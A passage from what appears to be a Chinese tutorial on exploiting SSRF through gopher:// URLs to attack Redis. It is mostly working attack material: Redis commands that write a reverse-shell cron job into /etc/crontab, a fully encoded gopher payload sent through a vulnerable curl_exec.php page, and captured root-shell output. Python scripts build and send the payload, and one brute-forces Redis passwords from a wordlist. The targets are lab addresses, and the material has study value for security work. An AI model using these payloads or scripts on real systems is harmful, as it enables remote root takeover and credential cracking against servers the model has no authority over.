&lt;p&gt;执行结果为下图，说明redis接收到了来自gopher的请求，但没有命令回显，为什么？（需要在命令后面加QUIT，后面会用到）&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624806164809-e5e3edbd-af7d-4928-8738-e54027fc5320.png#align=left&amp;amp;display=inline&amp;amp;height=174&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=174&amp;amp;originWidth=2446&amp;amp;size=483602&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2446&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;虽然无法回显命令执行的结果，但是命令确实是执行了，接下来测试下反弹shell（没有用上面讲的redis的数据包格式，下面的格式也可以），命令如下：&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;set mars &amp;quot;\n\n\n\n* * * * * root bash -i &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.119&#x2F;9999 0&amp;gt;&amp;amp;1\n\n\n\n&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;config set dir &#x2F;etc&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;config set dbfilename crontab
&lt;&#x2F;span&gt;&lt;span&gt;save
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;上述命令的含义总结为，利用Redis的备份功能，将crontab的定时任务备份到&#x2F;etc&#x2F;crontab中，起到执行命令的效果，因为Linux会监测&#x2F;etc&#x2F;crontab的内容，当我们将反弹shell的命令加入进去后，便会被执行，具体解释如下：&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;# 添加名为mars的key，值为后面反弹shell的语句,5个星号代表每分钟执行一次，开始和技术的\n必须要有一个，也就是前后各有一个，当然，多个可以，主要是为了避免crontab的语法错误。crontab知识可以参考：【https:&#x2F;&#x2F;www.runoob.com&#x2F;w3cnote&#x2F;linux-crontab-tasks.html】
&lt;&#x2F;span&gt;&lt;span&gt;set mars &amp;quot;\n\n\n\n* * * * * root bash -i &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.119&#x2F;9999 0&amp;gt;&amp;amp;1\n\n\n\n&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;# 设置备份的路径为&#x2F;etc
&lt;&#x2F;span&gt;&lt;span&gt;config set dir &#x2F;etc&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;# 设置备份文件名为crontab
&lt;&#x2F;span&gt;&lt;span&gt;config set dbfilename crontab
&lt;&#x2F;span&gt;&lt;span&gt;# 开始备份
&lt;&#x2F;span&gt;&lt;span&gt;save
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;进行二次URL编码，结果如下：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;http&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span&gt;http:&#x2F;&#x2F;192.168.0.109&#x2F;ssrf&#x2F;base&#x2F;curl_exec.php?url=gopher%3a%2f%2f192.168.0.119%3a6379%2f_%25%30%64%25%30%61%25%30%64%25%30%61%25%37%33%25%36%35%25%37%34%25%32%30%25%36%64%25%36%31%25%37%32%25%37%33%25%32%30%25%32%32%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%32%61%25%32%30%25%37%32%25%36%66%25%36%66%25%37%34%25%32%30%25%36%32%25%36%31%25%37%33%25%36%38%25%32%30%25%32%64%25%36%39%25%32%30%25%33%65%25%32%36%25%32%30%25%32%66%25%36%34%25%36%35%25%37%36%25%32%66%25%37%34%25%36%33%25%37%30%25%32%66%25%33%31%25%33%39%25%33%32%25%32%65%25%33%31%25%33%36%25%33%38%25%32%65%25%33%30%25%32%65%25%33%31%25%33%31%25%33%39%25%32%66%25%33%39%25%33%39%25%33%39%25%33%39%25%32%30%25%33%30%25%33%65%25%32%36%25%33%31%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%32%32%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%39%25%37%32%25%32%30%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%36%33%25%37%32%25%36%66%25%36%65%25%37%34%25%36%31%25%36%32%25%30%64%25%30%61%25%37%33%25%36%31%25%37%36%25%36%35%25%30%64%25%30%61
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;执行结果如下，1分钟后发现成功反弹shell。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;margine:~&lt;&#x2F;span&gt;&lt;span&gt; margin$ nc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -l&lt;&#x2F;span&gt;&lt;span&gt; 9999
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ls
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;bash:&lt;&#x2F;span&gt;&lt;span&gt; no job control in this shell
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[root@7471cd804b12 ~&lt;&#x2F;span&gt;&lt;span&gt;]# ls
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;anaconda-ks.cfg
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;install.log
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;install.log.syslog
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;简易脚本如下：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#!&#x2F;usr&#x2F;bin&#x2F;python
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# -*- coding: UTF-8 -*-
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;urllib2,urllib
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;url = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;192.168.0.109&#x2F;ssrf&#x2F;base&#x2F;curl_exec.php?url=&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;gopher = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;gopher:&#x2F;&#x2F;192.168.0.119:6379&#x2F;_&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 攻击脚本，\n的\一定要转义
&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;set mars &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;\&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;\n* * * * * root bash -i &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.119&#x2F;6670  0&amp;gt;&amp;amp;1\\n&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;config set &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;dir &lt;&#x2F;span&gt;&lt;span&gt;&#x2F;etc&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;config set dbfilename crontab
&lt;&#x2F;span&gt;&lt;span&gt;save
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;def encoder_url(data):
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;    encoder = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;    for single_char in data:
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;        # 先转为ASCII
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;        encoder += str(hex(ord(single_char)))
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;    encoder = encoder.replace(&amp;quot;0x&amp;quot;,&amp;quot;%&amp;quot;).replace(&amp;quot;%a&amp;quot;,&amp;quot;%0d%0a&amp;quot;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;    return encoder
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 二次编码
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;encoder = encoder_url(encoder_url(data))
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 生存payload
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;payload = url + urllib.quote(gopher,&amp;#39;utf-8&amp;#39;) + encoder
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 发起请求
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;request = urllib2.Request(payload)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;response = urllib2.urlopen(request).read()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;0x02-redisren-zheng-gong-ji&quot;&gt;0x02 Redis认证攻击&lt;&#x2F;h3&gt;
&lt;p&gt;以上为Redis未授权访问攻击，但如果Redis设置了密码呢？&lt;br &#x2F;&gt;如果要执行命令的话，必须要有密码才可以，所以接下来的问题便是如何破解Redis的密码，首先想到的暴力破解。此时要研究下Redis如何验证身份信息。方法还是抓包，抓到认证的流量，重放即可。抓包发现：&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;*2
&lt;&#x2F;span&gt;&lt;span&gt;$4
&lt;&#x2F;span&gt;&lt;span&gt;auth
&lt;&#x2F;span&gt;&lt;span&gt;$6
&lt;&#x2F;span&gt;&lt;span&gt;Margin
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以翻译为认证命令为auth xxxx&lt;br &#x2F;&gt;那么我们将redis的密码改为任意密码，我设置为Margin&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;config set requirepass Margin
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;将请求包改为&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;auth Margin
&lt;&#x2F;span&gt;&lt;span&gt;quit
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;python代码变为&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#!&#x2F;usr&#x2F;bin&#x2F;python
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# -*- coding: UTF-8 -*-
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;urllib2,urllib
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;url = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;192.168.0.109&#x2F;ssrf&#x2F;base&#x2F;curl_exec.php?url=&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;gopher = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;gopher:&#x2F;&#x2F;192.168.0.119:6379&#x2F;_&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;get_password&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    f = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;password.txt&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;,&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;f.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;readlines&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;encoder_url&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;data&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    encoder = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;single_char &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;data:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 先转为ASCII
&lt;&#x2F;span&gt;&lt;span&gt;        encoder += &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(single_char)))
&lt;&#x2F;span&gt;&lt;span&gt;    encoder = encoder.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;,&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%a&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;,&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%0d%0a&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;encoder
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;mark = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;get_password&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 攻击脚本
&lt;&#x2F;span&gt;&lt;span&gt;    data = &amp;quot;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;auth &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;    quit
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;    &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;quot;&amp;quot; % password
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 二次编码
&lt;&#x2F;span&gt;&lt;span&gt;    encoder = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encoder_url&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encoder_url&lt;&#x2F;span&gt;&lt;span&gt;(data))
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 生存payload
&lt;&#x2F;span&gt;&lt;span&gt;    payload = url + urllib.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;quote&lt;&#x2F;span&gt;&lt;span&gt;(gopher,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) + encoder
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 发起请求
&lt;&#x2F;span&gt;&lt;span&gt;    request = urllib2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Request&lt;&#x2F;span&gt;&lt;span&gt;(payload)
&lt;&#x2F;span&gt;&lt;span&gt;    response = urllib2.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;urlopen&lt;&#x2F;span&gt;&lt;span&gt;(request).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;response.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;count&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;+OK&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;) &amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;find password : &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; + password
&lt;&#x2F;span&gt;&lt;span&gt;        mark = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;mark == &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;not found&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;所以，在已知密码的情况下可以将攻击的python代码中加入认证的语句，如下：&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;auth Margin
&lt;&#x2F;span&gt;&lt;span&gt;set mars &amp;quot;\\n* * * * * root bash -i &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.119&#x2F;6671  0&amp;gt;&amp;amp;1\\n&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;config set dir &#x2F;etc&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;config set dbfilename crontab
&lt;&#x2F;span&gt;&lt;span&gt;save
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;python代码如下&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#!&#x2F;usr&#x2F;bin&#x2F;python
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# -*- coding: UTF-8 -*-
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;urllib2,urllib
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;url = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;192.168.0.109&#x2F;ssrf&#x2F;base&#x2F;curl_exec.php?url=&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;gopher = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;gopher:&#x2F;&#x2F;192.168.0.119:6379&#x2F;_&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 攻击脚本
&lt;&#x2F;span&gt;&lt;span&gt;data = &amp;quot;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;auth Margin
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;set mars &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;n* * * * * root bash -i &amp;gt;&amp;amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.0.119&#x2F;6671  0&amp;gt;&amp;amp;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;n&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;config set dir &#x2F;etc&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;config set dbfilename crontab
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;save
&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;encoder_url&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;data&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    encoder = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;single_char &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;data:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 先转为ASCII
&lt;&#x2F;span&gt;&lt;span&gt;        encoder += &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span&gt;(single_char)))
&lt;&#x2F;span&gt;&lt;span&gt;    encoder = encoder.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0x&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;,&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;%&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;replace&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%a&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;,&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%0d%0a&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;encoder
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 二次编码
&lt;&#x2F;span&gt;&lt;span&gt;encoder = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encoder_url&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encoder_url&lt;&#x2F;span&gt;&lt;span&gt;(data))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 生存payload
